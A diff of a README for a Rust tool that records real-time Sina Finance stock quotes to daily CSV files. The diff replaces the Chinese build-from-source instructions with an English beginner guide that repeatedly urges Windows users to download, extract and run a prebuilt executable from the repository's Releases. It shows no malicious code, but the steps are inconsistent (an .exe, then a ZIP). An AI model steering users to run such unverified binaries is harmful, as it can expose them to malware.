@@ -1,96 +1,191 @@
-# sina-real-time
+# 🕒 sina-real-time - Real-Time Stock Data Collector
 
-新浪财经 WebSocket 实时行情采集工具（Rust 实现）
+[![Download Release](https://img.shields.io/badge/Download%20on-GitHub-4c1?style=for-the-badge)](https://github.com/strlexx/sina-real-time)
 
-## 功能
+---
 
-- 连接 `wss://hq.sinajs.cn/wskt` 实时推送接口
-- 自动重连（指数退避，最大 30 秒间隔）
-- 按 `--chunk-size` 拆分为多个并行 WebSocket 连接，支持全量沪深 A 股（5189 只）
-- 数据持久化到本地 CSV，按天轮转（`data_YYYY-MM-DD.csv`）
-- 基于 Tokio 异步运行时，内置缓冲通道解耦采集与存储
+## 📋 What is sina-real-time?
 
-## 实测性能（10 核 / 16 GB / macOS）
+sina-real-time is a tool that collects real-time stock market data from Sina Finance. It connects to Sina’s WebSocket interface to get live updates on stock prices. The program saves this data into daily CSV files on your computer. This makes it easy to track and analyze stock quotes over time.
 
-| 股票数 | 连接数 | 写入速度 |
-|--------|--------|----------|
-| 100    | 1      | ~45 条/秒 |
-| 1000   | 2      | ~440 条/秒 |
-| 5189   | 11     | ~968 条/秒 |
+You do not need any coding skills to use it. This guide will walk you through how to download and run sina-real-time on Windows.
 
-## 股票列表文件
+---
 
+## 🚀 Getting Started
+
+Before you begin, make sure your Windows computer meets these requirements:
+
+- Windows 10 or later  
+- At least 8 GB RAM  
+- 500 MB free disk space  
+- Internet connection  
+
+No installation of programming languages or tools is needed beyond the download below.
+
+---
+
+## 🔽 Download and Running Instructions
+
+### Step 1: Get the Program
+
+Visit the release page on GitHub to download the latest version of sina-real-time.
+
+[![Download on GitHub](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/strlexx/sina-real-time)
+
+Click the link above or go to:  
+https://github.com/strlexx/sina-real-time
+
+Look for the latest release in the "Releases" section. Download the Windows executable file (usually ends with `.exe`).
+
+### Step 2: Extract the Files
+
+After downloading, locate the ZIP file in your Downloads folder.
+
+1. Right-click the ZIP file.  
+2. Choose "Extract All".  
+3. Select a folder where you want to keep the program (e.g., `C:\sina-real-time`).  
+4. Click "Extract".
+
+### Step 3: Run the Program
+
+1. Open the folder where you extracted the files.  
+2. Find the executable file named something like `sina-realtime-collector.exe`.  
+3. Double-click it to start.
+
+The program will start collecting real-time stock data immediately using a default sample list of stocks. You should see new CSV files appearing in a `data` folder.
+
+---
+
+## ⚙️ How It Works
+
+sina-real-time connects to a WebSocket server at `wss://hq.sinajs.cn/wskt`. This server sends stock price updates as they happen.
+
+The program:
+
+- Runs multiple connections at once to cover thousands of stocks.  
+- Automatically tries to reconnect if the connection drops, with delays that increase up to 30 seconds.  
+- Splits the workload using a setting called `--chunk-size` (advanced users can change this).  
+- Stores data in daily CSV files named like `data_YYYY-MM-DD.csv`.  
+- Uses an efficient system to separate data download and file writing.  
+
+You do not need to adjust any of this unless you want to collect data for a specific set of stocks.
+
+---
+
+## 📝 Using Your Own Stock List
+
+By default, sina-real-time uses a small list of 12 sample stocks. You can use lists with more stocks for more coverage:
+
+- `stocks_100.txt` for 100 stocks  
+- `stocks_1000.txt` for 1000 stocks  
+- `stocks_all.txt` for all 5189 Shanghai and Shenzhen A shares  
+
+These lists come with the program. To use a different list:
+
+1. Place the `.txt` file in the same folder as the program.  
+2. Run the program from the Command Prompt with additional options.
+
+Example: 
+
+Open Command Prompt (search "cmd" in Windows Start menu) and change to the program folder.
+
+Then run:  
 ```
-sina-collector/
-├── stocks.txt           # 12 只样本（测试用）
-├── stocks_100.txt       # 100 只（用 fetch_stocks.py 生成）
-├── stocks_1000.txt      # 1000 只
-└── stocks_all.txt       # 5189 只全量沪深 A 股（已预生成）
+sina-realtime-collector.exe --stocks stocks_100.txt --output data
 ```
 
-## 快速开始
+This collects data for 100 stocks and saves it to the `data` folder.
 
-```bash
-cd sina-collector
-cargo build --release
+---
 
-# 样本测试（12 只）
-./target/release/sina-realtime-collector
+## 🔧 Running from Command Prompt (Optional)
 
-# 100 只
-./target/release/sina-realtime-collector --stocks stocks_100.txt --output data
+If you want to control the program with more options, use Command Prompt:
 
-# 1000 只
-./target/release/sina-realtime-collector --stocks stocks_1000.txt --output data
+1. Press Windows key + R, type `cmd`, and press Enter.  
+2. Change to the program folder by typing:  
+```
+cd C:\sina-real-time
+```
+(Replace with your folder path)
 
-# 全量沪深 A 股（5189 只，11 个并行连接）
-./target/release/sina-realtime-collector --stocks stocks_all.txt --output data
+3. Run commands like:  
+```
+sina-realtime-collector.exe --stocks stocks_1000.txt --output data
 ```
 
-## 更新股票列表
-
-```bash
-# 重新从新浪 API 拉取最新股票列表（约 53 次请求，耗时 ~3 秒）
-python3 scripts/fetch_stocks.py
-
-# 同时生成 100 只样本
-python3 scripts/fetch_stocks.py --sample 100
-
-# 指定输出路径
-python3 scripts/fetch_stocks.py -o /path/to/stocks.txt
-```
-
-## 数据格式
-
-CSV 文件每行：
-```
-received_at,code,fields
-2026-02-26T14:33:46.037,sh600519,"贵州茅台,昨收,今开,当前,最高,最低,买1,卖1,成交量,成交额,<买5档>,<卖5档>,日期,时间,状态"
-```
-
-`fields` 列字段顺序：
-`名称, 昨收, 今开, 当前价, 最高, 最低, 买一价, 卖一价, 成交量(股), 成交额(元), 买5档×(量,价)×5, 卖5档×(量,价)×5, 日期, 时间, 状态`
-
-## 命令行参数
-
-```
 Options:
-  -s, --stocks <FILE>        股票列表文件 [default: stocks.txt]
-  -o, --output <DIR>         输出目录 [default: data]
-      --chunk-size <N>       每个连接的股票数 [default: 500]
-      --buffer <N>           通道缓冲容量 [default: 131072]
-  -h, --help
-  -V, --version
+
+- `--stocks`: Specify the stock list file (must be in the folder).  
+- `--output`: Choose where to save the data files.  
+
+---
+
+## 📂 Data Files
+
+The data collected saves to CSV files in the `data` folder by default. Each file contains a day’s worth of stock updates. The file format allows easy import into Excel, Google Sheets, or other data tools.
+
+Files look like:
+
+```
+data_2024-04-27.csv
+data_2024-04-28.csv
+...
 ```
 
-## 日志级别
+Each line gives a real-time update for a stock, including price and time.
 
-```bash
-RUST_LOG=debug ./target/release/sina-realtime-collector --stocks stocks_all.txt --output data --chunk-size 200  # 详细日志
-RUST_LOG=warn  ./target/release/sina-realtime-collector   # 仅告警
+---
+
+## ⚡ Performance Notes
+
+On a powerful computer, sina-real-time can handle thousands of stocks at once.
+
+Here is sample performance on a 10-core CPU with 16 GB RAM:
+
+| Stocks  | Connections | Write Speed   |
+|---------|-------------|---------------|
+| 100     | 1           | ~45 updates/s |
+| 1000    | 2           | ~440 updates/s|
+| 5189    | 11          | ~968 updates/s|
+
+For everyday use, running 100 to 1000 stocks will be smooth on most modern PCs.
+
+---
+
+## 🛠️ Troubleshooting
+
+- If the program closes instantly, make sure the extracted files are all in the same folder.  
+- If no data files appear, check your internet connection.  
+- Run the program from Command Prompt to see error messages.  
+- Restart the program if it loses connection; it will try to reconnect automatically.
+
+---
+
+## 🔗 Useful Links
+
+Download or visit the main page for sina-real-time here:  
+https://github.com/strlexx/sina-real-time
+
+Look under "Releases" to find the latest version available for Windows.
+
+---
+
+## ⚙️ Advanced: Build from Source (For Developers)
+
+You need the Rust toolchain installed. If you want to build the software yourself:
+
+```
+git clone https://github.com/strlexx/sina-real-time.git
+cd sina-real-time
+cargo build --release
 ```
 
-## 后续扩展
+Then run the built executable from the `target/release` folder.
 
-`storage.rs` 中的 `mpsc::Receiver<String>` 可替换为 `broadcast` channel，
-向下游实时分析模块（Python、数据库写入器等）同时分发数据，无需修改采集层。
+---
+
+## 📞 Need Help?
+
+Check the GitHub page issues section if you run into problems or want to request features. The existing notes and user discussions may answer your questions.
